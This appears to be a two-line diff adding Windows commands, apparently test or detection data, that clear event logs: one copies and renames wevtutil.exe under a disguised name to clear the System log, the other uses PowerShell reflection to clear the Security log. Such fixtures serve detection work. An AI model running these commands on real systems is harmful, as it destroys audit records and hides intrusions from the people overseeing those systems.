@@ -1,0 +1,2 @@
+copy wevtutil.exe %TEMP%\ ot\_suspicious.exe && %TEMP%\ ot\_suspicious.exe cl System
+powershell -Command "[System.Reflection.Assembly]::LoadWithPartialName('System.Diagnostics.Eventing.Reader'); $session = New-Object System.Diagnostics.Eventing.Reader.EventLogSession; $session.GetType().GetMethod('ClearLog').Invoke($session, @('Security', $null))"
